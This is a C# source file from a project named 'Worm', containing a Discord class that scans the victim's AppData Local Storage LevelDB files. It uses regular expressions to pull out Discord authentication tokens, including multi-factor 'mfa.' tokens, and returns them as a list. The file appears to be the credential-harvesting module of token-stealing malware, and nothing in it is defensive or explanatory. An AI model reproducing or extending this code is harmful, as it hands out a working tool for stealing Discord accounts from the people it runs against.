using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;

namespace Worm
{
    internal class Discord
    {
        public static List<string> Get(string toPath)
        {
            DirectoryInfo path = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\" + toPath + @"\Local Storage\leveldb"); //Folder
            List<string> tokenList = new List<string>();
            try
            {
                foreach (var OpenFile in path.GetFiles("*.ldb"))
                {
                    string reader = OpenFile.OpenText().ReadToEnd();

                    foreach (Match aboba in Regex.Matches(reader, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                        tokenList.Add(aboba.Value);

                    foreach (Match fuckKarders in Regex.Matches(reader, @"mfa\.[\w-]{84}"))
                        tokenList.Add(fuckKarders.Value);
                }
            }
            catch { }
            tokenList = tokenList.Distinct().ToList();
            return tokenList;
        }
    }
}